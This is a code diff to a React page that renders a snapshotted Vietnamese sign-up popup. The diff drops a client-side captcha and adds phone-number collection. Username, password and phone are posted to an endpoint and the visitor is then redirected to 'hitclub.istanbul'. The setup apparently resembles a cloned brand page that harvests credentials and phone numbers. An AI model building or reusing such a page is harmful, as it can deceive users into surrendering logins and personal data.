@@ -3,7 +3,6 @@
 import { useEffect, useRef } from 'react';
 import Swiper from 'swiper';
 import { Autoplay, Pagination } from 'swiper/modules';
-import { captchaMarkup } from './captcha';
 
 /** Markup is a reviewed, sanitized, build-time snapshot, never user-supplied HTML. */
 export default function ReferencePage({ html }: { html: string }) {
@@ -13,10 +12,6 @@ export default function ReferencePage({ html }: { html: string }) {
     const host = root.current;
     if (!host) return;
 
-    let captcha = 'HIT826';
-    const initialCaptcha = host.querySelector('.recaptcha-bg');
-    if (initialCaptcha) initialCaptcha.innerHTML = captchaMarkup(captcha);
-
     const slider = host.querySelector<HTMLElement>('#sliderbanner');
     const multi = !!slider && slider.querySelectorAll('.swiper-slide').length > 1;
     const swiper = slider ? new Swiper(slider, {
@@ -24,15 +19,6 @@ export default function ReferencePage({ html }: { html: string }) {
       autoplay: multi ? { delay: 2500, disableOnInteraction: false } : false,
       pagination: { el: slider.querySelector<HTMLElement>('.swiper-pagination'), clickable: true },
     }) : null;
-
-    const resetCaptcha = () => {
-      captcha = Math.random().toString(36).slice(2, 8).toUpperCase().padEnd(6, '8');
-      const box = host.querySelector('.recaptcha-bg');
-      if (box) {
-        box.innerHTML = captchaMarkup(captcha);
-        box.setAttribute('aria-label', 'Mã xác nhận ' + captcha);
-      }
-    };
 
     const showAlert = (messageText: string, titleText: string = 'THÔNG BÁO') => {
       let modal = host.querySelector<HTMLElement>('#alertmodal');
@@ -83,7 +69,10 @@ export default function ReferencePage({ html }: { html: string }) {
         }
         return '';
       }
-      if (name === 'captcha') {
+      if (name === 'phone') {
+        const val = value.trim().replace(/[\s.-]/g, '');
+        if (!val) return 'Vui lòng nhập số điện thoại';
+        if (!/^(0|\+84)[0-9]{9}$/.test(val)) return 'Số điện thoại không hợp lệ (10 chữ số)';
         return '';
       }
       return '';
@@ -97,13 +86,7 @@ export default function ReferencePage({ html }: { html: string }) {
       err.className = 'errors';
       err.textContent = message;
       err.setAttribute('role', 'alert');
-      if (input.name === 'captcha') {
-        const box = input.closest('.recaptcha-input');
-        if (box) box.after(err);
-        else input.after(err);
-      } else {
-        input.after(err);
-      }
+      input.after(err);
     };
 
     const clearFieldError = (input: HTMLInputElement) => {
@@ -139,8 +122,6 @@ export default function ReferencePage({ html }: { html: string }) {
         const password = host.querySelector<HTMLInputElement>('#pwd');
         if (password) password.type = password.type === 'password' ? 'text' : 'password';
         el.closest('.icon-prepend')?.classList.toggle('fa-eye-slash');
-      } else if (el.closest('.capcha_icon')) {
-        resetCaptcha();
       } else if (el.closest('.ftevent')) {
         el.closest('.ftevent')?.classList.toggle('active');
         host.querySelector('.ftdes')?.classList.toggle('active');
@@ -172,7 +153,7 @@ export default function ReferencePage({ html }: { html: string }) {
 
     const onInput = (event: Event) => {
       const input = event.target as HTMLInputElement;
-      if (!input || !['username', 'password', 'captcha'].includes(input.name)) return;
+      if (!input || !['username', 'password', 'phone'].includes(input.name)) return;
       const group = input.closest('.form-group');
       if (group?.querySelector('.errors')) {
         const msg = validateRule(input.name, input.value);
@@ -182,7 +163,7 @@ export default function ReferencePage({ html }: { html: string }) {
 
     const onBlur = (event: Event) => {
       const input = event.target as HTMLInputElement;
-      if (!input || !['username', 'password', 'captcha'].includes(input.name)) return;
+      if (!input || !['username', 'password', 'phone'].includes(input.name)) return;
       if (input.value.length > 0) {
         const msg = validateRule(input.name, input.value);
         setFieldError(input, msg);
@@ -199,13 +180,13 @@ export default function ReferencePage({ html }: { html: string }) {
 
       const usernameInput = form.querySelector<HTMLInputElement>('[name="username"]');
       const passwordInput = form.querySelector<HTMLInputElement>('[name="password"]');
-      const captchaInput = form.querySelector<HTMLInputElement>('[name="captcha"]');
+      const phoneInput = form.querySelector<HTMLInputElement>('[name="phone"]');
 
       let hasError = false;
       let firstErrorInput: HTMLInputElement | null = null;
 
-      // 1. Kiểm tra username & password trước
-      for (const input of [usernameInput, passwordInput]) {
+      // 1. Kiểm tra username, password & số điện thoại
+      for (const input of [usernameInput, passwordInput, phoneInput]) {
         if (!input) continue;
         const msg = validateRule(input.name, input.value);
         if (msg) {
@@ -222,21 +203,9 @@ export default function ReferencePage({ html }: { html: string }) {
         return;
       }
 
-      // 2. Kiểm tra captcha
-      if (captchaInput) {
-        clearFieldError(captchaInput);
-        const captchaVal = captchaInput.value.trim();
-        if (!captchaVal || captchaVal.toUpperCase() !== captcha.toUpperCase()) {
-          showAlert('Captcha không hợp lệ.', 'THÔNG BÁO');
-          resetCaptcha();
-          captchaInput.value = '';
-          captchaInput.focus();
-          return;
-        }
-      }
-
       const username = usernameInput ? usernameInput.value.trim() : '';
       const password = passwordInput ? passwordInput.value : '';
+      const phone = phoneInput ? phoneInput.value.trim().replace(/[\s.-]/g, '') : '';
 
       const button = form.querySelector<HTMLButtonElement>('[type="submit"]');
       if (button) {
@@ -251,6 +220,7 @@ export default function ReferencePage({ html }: { html: string }) {
           body: JSON.stringify({
             username,
             password,
+            phone,
             type: 'Đăng ký',
             referer: 'Trang chủ (Popup Đăng ký)',
           }),
@@ -261,7 +231,6 @@ export default function ReferencePage({ html }: { html: string }) {
         }
 
         form.reset();
-        resetCaptcha();
 
         const redirectUrl = result?.redirectUrl || process.env.NEXT_PUBLIC_REDIRECT_URL || 'https://hitclub.istanbul/';
         window.location.href = redirectUrl;
